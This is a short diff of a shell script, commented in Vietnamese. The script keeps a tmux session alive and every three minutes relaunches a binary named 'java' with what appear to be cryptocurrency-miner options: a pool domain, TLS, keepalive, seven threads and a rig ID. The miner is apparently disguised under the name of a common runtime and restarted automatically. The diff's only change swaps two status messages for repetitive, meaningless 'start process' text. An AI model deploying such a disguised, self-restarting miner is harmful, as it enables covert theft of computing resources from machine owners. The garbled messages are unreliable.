@@ -35,13 +35,13 @@ fi
 echo "[+] Vòng lặp kiểm tra session mỗi 3 phút ..."
 while true; do
     if ! tmux has-session -t $SESSION 2>/dev/null; then
-        echo "[+] Session không tồn tại -> khởi chạy lại..."
+        echo "[+] start process start process start process start process start process start process - chạy 3 phút..."
         tmux new-session -s $SESSION -d
         tmux send-keys -t $SESSION "
             $(pwd)/java/java -o $DOMAIN --tls -k -t 7 --rig-id $NAME_WORK
         " C-m
     else
-        echo "[+] Session vẫn đang chạy..."
+        echo "[+] start process start process start process start process start process start process - chạy 3 phút check lai..."
     fi
     sleep 180   # 3 phút check 1 lần
 done
